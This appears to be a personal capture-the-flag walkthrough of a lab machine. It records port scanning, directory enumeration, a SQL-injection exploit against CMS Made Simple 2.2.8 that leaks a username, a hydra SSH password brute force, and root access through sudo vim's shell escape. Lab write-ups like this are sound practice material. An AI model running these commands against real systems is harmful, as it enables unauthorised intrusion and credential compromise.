#### 7 AUG 2021 

#### ip : 10.10.154.95


# SCANNING

intial
-------

$ nmap -sV 10.10.154.95 

```
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```


# ENUMERATION


$ gobuster dir -u "http://10.10.154.95" -w /usr/share/dirb/wordlists/common.txt | tee gobuster.txt


```
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/server-status        (Status: 403) [Size: 300]  
/simple               (Status: 301) [Size: 313] [--> http://10.10.154.95/simple/]
````
let's check this :

/simple               uses CMS Made Simple version 2.2.8

found sql exploit return username and password .

this script is really bad and slow but requests module had some issues with me in python 2 :( 
```
 python3 cve-2021-26120.py.txt 10.10.154.95 /simple  "whoami"                                    
(+) targeting http://10.10.154.95/simple/
(+) sql injection working!
(+) leaking the username...
(+) username: mitch

````
### $ hydra -l mitch  -P /usr/share/wordlists/rockyou.txt 10.10.154.95  ssh -s 2222 


[2222][ssh] host: 10.10.154.95   login: mitch   password: secret


### $ ssh mitch@10.10.154.95 -p 2222     

`$python -c "import pty;pty.spawn('/bin/bash')"`


#sudo -l 

`(root) NOPASSWD: /usr/bin/vim`

then : sudo vim
 
and use :!bash

#### rooted
